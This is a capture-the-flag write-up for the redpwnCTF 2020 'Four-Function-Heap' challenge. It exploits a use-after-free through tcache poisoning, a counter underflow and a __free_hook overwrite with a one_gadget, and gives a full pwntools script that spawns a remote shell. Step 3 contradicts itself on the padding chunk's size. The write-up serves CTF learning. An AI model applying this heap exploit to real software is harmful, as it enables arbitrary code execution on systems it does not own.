# Four-Function-Heap
Pwn, 490

> When ctf writers can't think of interesting problems, there's always four function heap
> 
> nc 2020.redpwnc.tf 31774

My first decent heap solve :)

The idea is to get a write and overwrite one of the hooks (I chose to overwrite `__free_hook`) with a one_gadget to get a shell.

Usual security checks gives us:
```
boshua@cybersec:~/fourfunction/bin$ pwn checksec four-function-heap 
[*] '/home/boshua/fourfunction/bin/four-function-heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

and

```
boshua@cybersec:~/fourfunction$ strings libc-2.27.so | grep GNU
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Compiled by GNU CC version 7.3.0.
```

Meaning it's probably heap exploitation as pointed out by the title.

The binary is also running on the standard `libc-2.27.so`, so tcache exploitation is probably the way to go as this version of libc doesn't really have security checks for it.

Some interesting things to note:
- Only have 14 operations in total
- Can only use index 0 to read/write/delete; the program won't accept any other index

Opening the binary into Ghidra, there is a pretty clear UAF vulnerability - when a chunk is created, a variable gets set to that pointer but isn't reset when that chunk is freed.

1. I first allocated a `0x100` sized chunk, and leaked its address with a double free and showed it. I needed this address to forge chunks later on.

2. I allocated another `0x100` chunk from the tcache freelist, and wrote the address I leaked from step 1. The tcache freelist is still the same, but now the counter is `1`. See appendix for why I did this.

3. Next, I allocated a padding chunk of size `0x420`. This chunk serves as a padding between the chunk from step 2 and the top, making sure that the previous chunk doesn't get merged with the top when it's freed. Note that this chunk is `0x100` size, because I wanted to pull from the top chunk, not the tcache.

4. I allocated another chunk of size `0x100`, as well as writing the leaked chunk address from step 1. This chunk also comes from the tcache freelist, and reduces the counter to `0x00`.

5. I finally allocated one more `0x100` chunk from tcache. This one underflowed the tcache counter to `0xff`. The pointer to this chunk was the original leaked pointer, from my overwrite in step 4.

6. I then freed it, so its address wound up in the unsorted bin. The unsorted bin's top chunk gets a pointer to the main arena (inside libc) written to it, so I leaked that.

7. I showed the chunk from step 5 and leaked the libc pointer.
    
    I calculated the libc base address from the leak, and then calculated the addresses of the `__free_hook` and the one_gadget I found.
    
8. I allocated a `0x40` sized chunk. This basically split my chunk from step 5 into two smaller chunks due to glibc's first-fit allocation. I wrote the address of `__free_hook` to this chunk.

    The address of this chunk is pointed to by the first free in action 1. After writing the address of `__free_hook`, the tcache looks something like `top -> chunk1 -> __free_hook`

9. I allocated a `0x100` sized chunk from tcache. This removed one from the tcache freelist and set me up for the `__free_hook` overwrite.

10. I allocated a `0x100` sized chunk from tcache. This chunk's address was the `__free_hook` address that I wrote in step 8. So, I can just overwrite that address with the address of the one_gadget.

11. I freed a chunk for the last time, triggering `__free_hook` and spawning the shell.


```python
from pwn import *

p = remote("2020.redpwnc.tf", 31774)
#p = process("./bin/four-function-heap")
e = ELF("./bin/four-function-heap")
libc = ELF("./libc-2.27.so")

'''
gdb.attach(p, """break * 0x555555554a50
c""")
'''

def alloc(idx, size, data="AAAA"):
	print("alloc")
	p.recvuntil(":")
	p.sendline("1")
	p.sendlineafter(": ", str(idx))
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", data)

def free(idx):
	print("free")
	p.recvuntil(":")
	p.sendline("2")
	p.sendlineafter(": ", str(idx))

def show(idx):
	print("show")
	p.recvuntil(":")
	p.sendline("3")
	p.sendlineafter(": ", str(idx))

# Your Code Here
alloc(0, 0x100)

free(0)
free(0)
show(0)

dat = p.recvline()

curr_chunk = u64(dat[:6].ljust(8, "\x00"))
print("curr_chunk", hex(curr_chunk))

alloc(0, 0x100, p64(curr_chunk))
alloc(0, 0x420)
alloc(0, 0x100, p64(curr_chunk))
alloc(0, 0x100, "CCCCCCCC")
free(0)
show(0)

dat = p.recvline()
libc_leak = u64(dat[:6].ljust(8, "\x00"))
print("libc leak", hex(libc_leak))

libc.address = libc_leak - 0x3ebca0
print("libc address", hex(libc.address))

free_hook = libc.sym["__free_hook"]
one_gadg = libc.address + 0x4f322

print("free hook", hex(free_hook))
print("one gadget", hex(one_gadg))

alloc(0, 0x40, p64(free_hook))
alloc(0, 0x100, "AAAAAAAA")
alloc(0, 0x100, p64(one_gadg))
free(0)

p.interactive()
```

Flag: `flag{g3n3ric_f1ag_1n_1e3t_sp3ak}`


### Appendix
I wanted to leak libc to get the one_gadget address (I only had an offset from libc base due to the security protections).

The standard approach is to fill up the tcache freelist. Then, you can allocate and free one more chunk to get it in the unsorted bin, whos `fd` pointer will have a pointer to a libc address.

Each tcache bin only holds 7 freed addresses, so you can usually accomplish this by allocating 7 times, then freeing 7 times. However, that in itself is 14 operations, meaning I can't use that.

The option that I used was to underflow the tcache counter. The idea is to basically request allocations from the tcache freelist until you underflow the counter, setting it equal to 0xff. Then, you can allocate and free one more chunk to get it into the unsorted bin.